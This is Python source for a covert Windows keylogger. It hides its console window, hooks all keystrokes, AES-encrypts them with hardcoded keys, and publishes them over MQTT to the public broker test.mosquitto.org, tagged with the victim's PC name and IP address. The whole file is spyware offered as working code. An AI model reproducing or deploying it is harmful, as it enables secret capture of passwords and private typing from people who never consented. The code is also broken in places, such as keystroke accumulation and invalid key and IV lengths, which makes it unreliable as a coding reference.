import pythoncom,pyHook
import win32event, win32api, winerror, win32gui, win32console
import paho.mqtt.publish as publish
import platform
import ipgetter
from Crypto.Cipher import AES

HOSTNAME = "test.mosquitto.org"
PORT = 1883
PC_NAME = platform.node()
IP_ADDR = globalIp = ipgetter.myip()

win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

# TODO: creat global static variable - 'keys'

def encryptIt(text):
    key="y]}&)W%[T]$4g^2CA~*Tb7LXWYB`^f"
    iv="8&YC9ZvMaxP@wOz|%*sf3QN0G/cp+U5$>gDorLmhE1l#eJ,*yWbdB_2KV(n=i?HSuX^{TI4;jq}'FA[:).t!<kR]67"
    obj = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = obj.encrypt(text)
    return ciphertext

    '''
    ciphertext = "\\xd6\\x83\\x8dd!VT\\x92\\xaa`A\\x05\\xe0\\x9b\\x8b\\xf1""
    key = "y]}&)W%[T]$4g^2CA~*Tb7LXWYB`^f"
    iv = "8&YC9ZvMaxP@wOz|%*sf3QN0G/cp+U5$>gDorLmhE1l#eJ,*yWbdB_2KV(n=i?HSuX^{TI4;jq}'FA[:).t!<kR]67"
    obj2 = bj = AES.new(key, AES.MODE_CBC, iv)
    obj2.decrypt(ciphertext)
    '''

def sendKeys(keys):
    publish.single("logger/" + PC_NAME + "@" + IP_ADDR, encryptIt(keys), 0, False, HOSTNAME, PORT)
    # TODO: reset keys


def keypressed(event):
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)

    keys+=keys

    if len(keys) > 2000:
        sendKeys(keys)

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()